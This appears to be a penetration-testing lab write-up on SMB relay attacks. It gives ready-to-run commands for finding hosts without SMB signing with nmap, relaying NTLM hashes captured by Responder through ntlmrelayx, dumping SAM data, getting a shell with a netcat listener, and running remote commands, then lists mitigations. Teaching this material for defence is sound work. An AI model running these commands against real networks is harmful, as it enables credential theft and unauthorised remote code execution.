### **SMB Relay Attack:**

Instead of cracking hashes gathered with **Responder**, we can **relay** those hashes to specific machines and potentially gain access by leveraging **SMB relay attacks**.

#### **Requirements:**

- **SMB Signing** must be disabled or not enforced on the target machine.
- The relayed user credentials must have **administrator** privileges on the target machine for a meaningful exploit.

---

### **Identifying Vulnerable Hosts:**

1. **Using Nmap to Identify Hosts Without SMB Signing:**

We can use **Nmap** to identify machines that do not have SMB signing enabled. This can be done with the following command:

`nmap --script=smb2-security-mode.nse -p445 <Target IP>`

This will scan for SMB security modes and tell us if SMB signing is enforced.

2. **Identifying Vulnerable Hosts:**

Once we have the results from Nmap, we can identify which hosts are vulnerable. In my environment the DC is not vulnerable as it enforces code signing but our workstations are.

---

### **SMB Relay Attack Setup:**

1. **Creating a Target List:**

We create a `targets.txt` file containing the IPs of the identified vulnerable machines.

2. **Configuring Responder:**

Next, we modify the **Responder** configuration file to disable unnecessary services:

`sudo mousepad /etc/responder/Responder.conf`

In the configuration, we disable **HTTP** and **SMB** services.

3. **Running ntlmrelayx:**

Now we use **ntlmrelayx** to forward any captured hashes to the identified target machines. Run the following command:

`ntlmrelayx.py -tf targets.txt -smb2support`
![image](https://github.com/user-attachments/assets/f1351a05-e4b1-41ed-8394-634e025610fa)

This will relay the captured hashes to the target hosts. The attack will try to authenticate using the relayed NTLM hashes.

---

### **Gaining Shell Access:**

1. **Relaying to Get a Shell:**

In addition to dumping the SAM file, we can use the `-i` option to get a reverse shell from the relayed machine:

`ntlmrelayx.py -tf targets.txt -smb2support -i`
![image](https://github.com/user-attachments/assets/e86fbbbd-6154-4877-ba83-89234f043e72)

2. **Setting Up Netcat Listener:**

We set up a Netcat listener on localhost to catch the reverse shell:

`nc -lvp <Port>`

![image](https://github.com/user-attachments/assets/71160416-30e6-4da6-a377-8f750cea7982)

3. **Running Commands on the Target Machine (Using the `-c` Flag):**

Instead of waiting for the reverse shell, we can use the **`-c` flag** in `ntlmrelayx` to execute specific commands directly on the target machine. For example, to run `whoami` on the target:

`ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
![image](https://github.com/user-attachments/assets/f50ae36f-8aa3-43ab-81e4-b2ca64263db6)


This allows us to run commands remotely without needing to establish an interactive shell.

---

### **Mitigation Strategies:**

To prevent SMB relay attacks, consider the following mitigations:

1. **Enabling SMB Signing on All Devices:**
    
    - **Pro:** Completely stops the attack.
    - **Con:** May cause performance issues, particularly with file transfers.
2. **Disabling NTLM Authentication:**
    
    - **Pro:** Completely stops the attack.
    - **Con:** If **Kerberos** fails, Windows defaults back to NTLM.
3. **Local Admin Restrictions:**  
    Limit local administrator privileges to reduce the potential impact of compromised credentials.
    
4. **Account Tiering/Least Privilege:**  
    Implement account tiering and least privilege practices to restrict the scope of any attack.
